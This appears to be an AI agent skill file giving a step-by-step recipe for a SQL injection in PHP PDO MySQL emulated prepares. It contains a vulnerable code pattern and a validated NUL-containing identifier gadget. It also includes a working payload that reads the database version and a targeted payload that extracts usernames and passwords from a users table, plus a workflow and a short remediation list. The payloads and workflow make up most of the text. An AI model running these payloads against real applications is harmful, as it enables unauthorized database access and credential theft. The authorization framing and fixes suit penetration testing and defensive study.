---
name: pdo-mysql-emulated-prepare-identifier-confusion
description: Reproduce PDO MySQL emulated-prepare SQLi where a user-controlled backticked identifier steals a placeholder and a bound parameter becomes SQL.
---

# PDO MySQL Emulated-Prepare Identifier Confusion

## Preconditions
- PHP PDO MySQL connection leaves emulated prepares enabled.
- User input is interpolated into a backtick-quoted identifier before `prepare()`.
- A separate attacker-controlled value is bound to the intended `?` placeholder.

Representative vulnerable shape:
```php
$sort = $_GET['sort'];
$value = $_GET['user_id'];
$col = '`' . str_replace('`', '', $sort) . '`';
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ?");
$stmt->execute([$value]);
```

## Validated parser gadget
The PHP-decoded identifier gadget is:
- hex: `5c 3f 3b 2d 2d 20 2d 00`
- text semantics: one literal backslash, `?`, semicolon, `-- -`, NUL.

Do not confuse source-code escaping with wire bytes: published text may display `\\?`, but the working HTTP request can contain one literal backslash byte (`0x5c`) before `?`. Always preserve the raw request target and decoded parameter hex.

## Proof construction
Use the bound parameter as the actual injected SQL:
```sql
x` FROM (SELECT VERSION() AS `'x`)y;-- -
```
The exact outer derived-table alias and backtick/apostrophe sequence matter. Confirm success by observing the database version in the application's selected-column rendering.

## Targeted extraction rule
Literal quoted filters inside the bound payload may be escaped during PDO emulated substitution and silently break the injected SQL. Prefer quote-free MySQL hex literals:
```sql
WHERE `role`=0x61756374696f6e656572
```
instead of:
```sql
WHERE `role`='auctioneer'
```

A minimal single-row extraction shape is:
```sql
x` FROM (
  SELECT concat(username,0x3a,password) AS `'x`
  FROM users
  WHERE `role`=0x61756374696f6e656572
  LIMIT 1
)y;-- -
```

## Workflow
1. Authenticate if the endpoint requires a session.
2. Locally validate raw request-target bytes and PHP-decoded parameter hex.
3. Send one harmless VERSION()/fixed scalar proof.
4. Only after proof, retrieve the single minimal record needed for authorized impact demonstration.
5. Avoid schema/table dumps and unrelated records.
6. Preserve raw requests/responses and hashes; store recovered secrets in restricted files.

## Failure lessons
- Backtick stripping is not an adequate allowlist and does not make identifier interpolation safe.
- Two literal backslashes (`5c5c3f`) failed where the working request required one (`5c3f`).
- A syntactically plausible fixed-marker payload is not equivalent to the known working derived-table construction.
- Quoted `WHERE` values can be corrupted by PDO escaping; quote-free hex literals preserve the intended filter.

## Remediation
- Disable emulated prepares: `PDO::ATTR_EMULATE_PREPARES => false`.
- Never parameterize or interpolate identifiers from arbitrary user input; map user choices through a strict server-side allowlist.
- Add regression tests with parser-confusion bytes and NULs.
